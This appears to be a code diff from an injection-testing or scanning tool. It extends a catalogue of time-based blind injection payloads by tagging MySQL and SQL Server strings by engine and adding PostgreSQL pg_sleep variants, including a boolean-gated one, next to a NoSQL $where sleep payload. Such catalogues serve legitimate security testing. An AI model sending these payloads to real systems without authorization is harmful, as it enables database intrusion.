@@ -75,9 +75,12 @@ TECHNIQUE_CATEGORIES: dict[str, dict[str, Any]] = {
         "description": "Inject delay to detect blind execution via timing anomaly",
         "variants": {
             "sql": [
-                "SLEEP(5)--",
-                "BENCHMARK(10000000,SHA1('x'))--",
-                "WAITFOR DELAY '0:0:5'--",
+                ("SLEEP(5)--", "mysql"),                  # MySQL
+                ("BENCHMARK(10000000,SHA1('x'))--", "mysql"),  # MySQL
+                ("WAITFOR DELAY '0:0:5'--", "mssql"),     # SQL Server
+                ("'; SELECT pg_sleep(5)--", "postgres"),  # PostgreSQL (statement-terminated)
+                ("' || pg_sleep(5)--", "postgres"),       # PostgreSQL (string-context)
+                ("'; SELECT CASE WHEN (1=1) THEN pg_sleep(5) ELSE pg_sleep(0) END--", "postgres"),  # PG boolean-gated
             ],
             "nosql": [
                 '{"$where": "sleep(5000)"}',
